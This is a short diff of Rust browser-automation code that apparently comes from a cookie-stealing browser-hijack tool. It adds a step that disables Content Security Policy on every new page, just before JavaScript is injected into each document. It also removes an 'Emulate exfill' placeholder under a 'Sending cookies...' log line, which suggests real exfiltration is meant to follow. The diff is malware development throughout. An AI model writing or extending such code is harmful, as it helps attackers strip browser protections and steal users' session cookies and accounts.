@@ -1,7 +1,7 @@
 use chromiumoxide::{
     browser::{Browser, BrowserConfig},
     cdp::browser_protocol::{
-        page::AddScriptToEvaluateOnNewDocumentParams,
+        page::{AddScriptToEvaluateOnNewDocumentParams, SetBypassCspParams},
         target::TargetId
     }
 };
@@ -80,6 +80,10 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
                 println!("[+] New page detected");
 
                 #[cfg(feature = "debug")]
+                println!("[+] Disabling csp");
+                 page.execute(SetBypassCspParams::new(true)).await?;
+
+                #[cfg(feature = "debug")]
                 println!("[*] Injecting JS into page with ID: {:?}", page_id);
                 page.execute(
                     AddScriptToEvaluateOnNewDocumentParams::builder()
@@ -115,9 +119,6 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
 
         #[cfg(feature = "debug")]
         println!("[*] Sending cookies...");
-
-        // Emulate exfill
-        sleep(Duration::from_secs(1)).await;
 
         #[cfg(feature = "debug")]
         println!("[+] Done");
